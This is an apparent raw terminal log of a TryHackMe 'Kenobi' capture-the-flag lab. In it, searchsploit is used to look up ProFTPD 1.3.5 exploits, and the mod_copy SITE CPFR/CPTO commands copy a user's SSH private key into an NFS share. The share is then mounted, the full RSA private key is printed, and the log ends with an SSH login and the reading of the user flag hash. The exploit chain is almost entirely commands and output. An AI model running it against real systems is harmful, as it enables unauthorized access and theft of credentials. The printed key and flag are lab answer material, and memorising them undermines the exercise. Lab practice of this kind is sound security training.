┌──(kali㉿kali)-[~]                                            
└─$ nc 10.10.57.242 21                                         
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.57.242]                                                        
^C                                                             

┌──(kali㉿kali)-[~]                                            
└─$ searchsploit                                               
  Usage: searchsploit [options] term1 [term2] ... [termN]      

==========                                                     
 Examples                                                      
==========                                                     
  searchsploit afd windows local                               
  searchsploit -t oracle windows                               
  searchsploit -p 39446                                        
  searchsploit linux kernel 3.2 --exclude="(PoC)|/dos/"        
  searchsploit -s Apache Struts 2.0.0                          
  searchsploit linux reverse password                          
  searchsploit -j 55555 | json_pp                              

  For more examples, see the manual: https://www.exploit-db.com/searchsploit                                                  

=========                                                      
 Options                                                       
=========                                                      
## Search Terms                                                
   -c, --case     [Term]      Perform a case-sensitive search (Default is inSEnsITiVe)                                        
   -e, --exact    [Term]      Perform an EXACT & order match on exploit title (Default is an AND match on each term) [Implies "-t"]                                                                                                                          
                                e.g. "WordPress 4.1" would not be detect "WordPress Core 4.1")                                
   -s, --strict               Perform a strict search, so input values must exist, disabling fuzzy search for version range   
                                e.g. "1.1" would not be detected in "1.0 < 1.3")                                              
   -t, --title    [Term]      Search JUST the exploit title (Default is title AND the file's path)                            
       --exclude="term"       Remove values from results. By using "|" to separate, you can chain multiple values             
                                e.g. --exclude="term1|term2|term3"                                                            

## Output                                                      
   -j, --json     [Term]      Show result in JSON format       
   -o, --overflow [Term]      Exploit titles are allowed to overflow their columns                                            
   -p, --path     [EDB-ID]    Show the full path to an exploit (and also copies the path to the clipboard if possible)        
   -v, --verbose              Display more information in output                                                              
   -w, --www      [Term]      Show URLs to Exploit-DB.com rather than the local path                                          
       --id                   Display the EDB-ID value rather than local path                                                 
       --colour               Disable colour highlighting in search results                                                   

## Non-Searching                                               
   -m, --mirror   [EDB-ID]    Mirror (aka copies) an exploit to the current working directory                                 
   -x, --examine  [EDB-ID]    Examine (aka opens) the exploit using $PAGER                                                    

## Non-Searching                                               
   -h, --help                 Show this help screen            
   -u, --update               Check for and install any exploitdb package updates (brew, deb & git)                           

## Automation                                                  
       --nmap     [file.xml]  Checks all results in Nmap's XML output with service version                                    
                                e.g.: nmap [host] -sV -oX file.xml                                                            

=======                                                        
 Notes                                                         
=======                                                        
 * You can use any number of search terms                      
 * By default, search terms are not case-sensitive, ordering is irrelevant, and will search between version ranges            
   * Use '-c' if you wish to reduce results by case-sensitive searching                                                       
   * And/Or '-e' if you wish to filter results by using an exact match                                                        
   * And/Or '-s' if you wish to look for an exact version match                                                               
 * Use '-t' to exclude the file's path to filter the search results                                                           
   * Remove false positives (especially when searching using numbers - i.e. versions)                                         
 * When using '--nmap', adding '-v' (verbose), it will search for even more combinations                                      
 * When updating or displaying help, search terms will be ignored                                                             


┌──(kali㉿kali)-[~]                                            
└─$ searchsploit proftpd 1.3.5                                 
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                                             |  Path                           
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)                                                                                                                                                                  | linux/remote/37262.rb           
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution                                                                                                                                                                        | linux/remote/36803.py           
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2)                                                                                                                                                                    | linux/remote/49908.py           
ProFTPd 1.3.5 - File Copy                                                                                                                                                                                                  | linux/remote/36742.txt          
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results                                         

┌──(kali㉿kali)-[~]                                            
└─$ nc 10.10.57.242 21                                         
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.57.242]                                                                                    
SITE CPFR /home/kenobi/.ssh/id_rsa                             
350 File or directory exists, ready for destination name       
SITE CPTO /var/tmp/id_rsa                                      
250 Copy successful                                            
^C                                                             

┌──(kali㉿kali)-[~]                                            
└─$ mkdir /mnt/kenobiMNT                                       
mkdir: cannot create directory ‘/mnt/kenobiMNT’: Permission denied                                                            

┌──(kali㉿kali)-[~]                                            
└─$ sudo !!                                                    
sudo mkdir /mnt/kenobiMNT                                      
[sudo] password for kali:                                      

┌──(kali㉿kali)-[~]                                            
└─$ mount 10.10.57.242:/var /mnt/kenobiMNT                     
mount.nfs: failed to apply fstab options                       

┌──(kali㉿kali)-[~]                                            
└─$ sudo !!                                                    
sudo mount 10.10.57.242:/var /mnt/kenobiMNT                    

┌──(kali㉿kali)-[~]                                            
└─$ cd /mnt/kenobiMNT/                                         

┌──(kali㉿kali)-[/mnt/kenobiMNT]                               
└─$ ls                                                         
backups  cache  crash  lib  local  lock  log  mail  opt  run  snap  spool  tmp  www                                           

┌──(kali㉿kali)-[/mnt/kenobiMNT]                               
└─$ cd tmp/                                                    

┌──(kali㉿kali)-[/mnt/kenobiMNT/tmp]                           
└─$ ls                                                         
id_rsa                                                                             systemd-private-6f4acd341c0b40569c92cee906c3edc9-systemd-timesyncd.service-z5o4Aw  systemd-private-e69bbb0653ce4ee3bd9ae0d93d2a5806-systemd-timesyncd.service-zObUdn      
systemd-private-2408059707bc41329243d2fc9e613f1e-systemd-timesyncd.service-a5PktM  systemd-private-e51065af09f64175a615e57186257673-systemd-timesyncd.service-l9HbgH                                                                                         

┌──(kali㉿kali)-[/mnt/kenobiMNT/tmp]                           
└─$ cat id_rsa                                                 
-----BEGIN RSA PRIVATE KEY-----                                
MIIEowIBAAKCAQEA4PeD0e0522UEj7xlrLmN68R6iSG3HMK/aTI812CTtzM9gnXs                                                              
qpweZL+GJBB59bSG3RTPtirC3M9YNTDsuTvxw9Y/+NuUGJIq5laQZS5e2RaqI1nv                                                              
U7fXEQlJrrlWfCy9VDTlgB/KRxKerqc42aU+/BrSyYqImpN6AgoNm/s/753DEPJt                                                              
dwsr45KFJOhtaIPA4EoZAq8pKovdSFteeUHikosUQzgqvSCv1RH8ZYBTwslxSorW                                                              
y3fXs5GwjitvRnQEVTO/GZomGV8UhjrT3TKbPhiwOy5YA484Lp3ES0uxKJEnKdSt                                                              
otHFT4i1hXq6T0CvYoaEpL7zCq7udl7KcZ0zfwIDAQABAoIBAEDl5nc28kviVnCI                                                              
ruQnG1P6eEb7HPIFFGbqgTa4u6RL+eCa2E1XgEUcIzxgLG6/R3CbwlgQ+entPssJ                                                              
dCDztAkE06uc3JpCAHI2Yq1ttRr3ONm95hbGoBpgDYuEF/j2hx+1qsdNZHMgYfqM                                                              
bxAKZaMgsdJGTqYZCUdxUv++eXFMDTTw/h2SCAuPE2Nb1f1537w/UQbB5HwZfVry                                                              
tRHknh1hfcjh4ZD5x5Bta/THjjsZo1kb/UuX41TKDFE/6+Eq+G9AvWNC2LJ6My36                                                              
YfeRs89A1Pc2XD08LoglPxzR7Hox36VOGD+95STWsBViMlk2lJ5IzU9XVIt3EnCl                                                              
bUI7DNECgYEA8ZymxvRV7yvDHHLjw5Vj/puVIQnKtadmE9H9UtfGV8gI/NddE66e                                                              
t8uIhiydcxE/u8DZd+mPt1RMU9GeUT5WxZ8MpO0UPVPIRiSBHnyu+0tolZSLqVul                                                              
rwT/nMDCJGQNaSOb2kq+Y3DJBHhlOeTsxAi2YEwrK9hPFQ5btlQichMCgYEA7l0c                                                              
dd1mwrjZ51lWWXvQzOH0PZH/diqXiTgwD6F1sUYPAc4qZ79blloeIhrVIj+isvtq                                                              
mgG2GD0TWueNnddGafwIp3USIxZOcw+e5hHmxy0KHpqstbPZc99IUQ5UBQHZYCvl                                                              
SR+ANdNuWpRTD6gWeVqNVni9wXjKhiKM17p3RmUCgYEAp6dwAvZg+wl+5irC6WCs                                                              
dmw3WymUQ+DY8D/ybJ3Vv+vKcMhwicvNzvOo1JH433PEqd/0B0VGuIwCOtdl6DI9                                                              
u/vVpkvsk3Gjsyh5gFI8iZuWAtWE5Av4OC5bwMXw8ZeLxr0y1JKw8ge9NSDl/Pph                                                              
YNY61y+DdXUvywifkzFmhYkCgYB6TeZbh9XBVg3gyhMnaQNzDQFAUlhM7n/Alcb7                                                              
TjJQWo06tOlHQIWi+Ox7PV9c6l/2DFDfYr9nYnc67pLYiWwE16AtJEHBJSHtofc7                                                              
P7Y1PqPxnhW+SeDqtoepp3tu8kryMLO+OF6Vv73g1jhkUS/u5oqc8ukSi4MHHlU8                                                              
H94xjQKBgExhzreYXCjK9FswXhUU9avijJkoAsSbIybRzq1YnX0gSewY/SB2xPjF                                                              
S40wzYviRHr/h0TOOzXzX8VMAQx5XnhZ5C/WMhb0cMErK8z+jvDavEpkMUlR+dWf                                                              
Py/CLlDCU4e+49XBAPKEmY4DuN+J2Em/tCz7dzfCNS/mpsSEn0jo           
-----END RSA PRIVATE KEY-----                                  

┌──(kali㉿kali)-[/mnt/kenobiMNT/tmp]                           
└─$ cp id_rsa /home/kali/GitHub/TryHackMe/Kenobi/              

┌──(kali㉿kali)-[/mnt/kenobiMNT/tmp]                           
└─$ cd /home/kali/GitHub/TryHackMe/Kenobi/                     

┌──(kali㉿kali)-[~/GitHub/TryHackMe/Kenobi]                    
└─$ ls                                                         
deploy.log  enumerate.log  id_rsa  README.md                   

┌──(kali㉿kali)-[~/GitHub/TryHackMe/Kenobi]                    
└─$ sudo chmod 600 id_rsa                                      

┌──(kali㉿kali)-[~/GitHub/TryHackMe/Kenobi]                    
└─$ ssh -i id_rsa kenobi@10.10.57.242                          
The authenticity of host '10.10.57.242 (10.10.57.242)' can't be established.                                                  
ECDSA key fingerprint is SHA256:uUzATQRA9mwUNjGY6h0B/wjpaZXJasCPBY30BvtMsPI.                                                  
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes                                                      
Warning: Permanently added '10.10.57.242' (ECDSA) to the list of known hosts.                                                 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.8.0-58-generic x86_64)                                                             

 * Documentation:  https://help.ubuntu.com                     
 * Management:     https://landscape.canonical.com             
 * Support:        https://ubuntu.com/advantage                

103 packages can be updated.                                   
65 updates are security updates.                               


Last login: Wed Sep  4 07:10:15 2019 from 192.168.1.147        
To run a command as administrator (user "root"), use "sudo <command>".                                                        
See "man sudo_root" for details.                               

kenobi@kenobi:~$ ls                                            
share  user.txt                                                
kenobi@kenobi:~$ cat user.txt                                  
d0b0f3f53b6caa532a83915e19224899                               
kenobi@kenobi:~$                                               
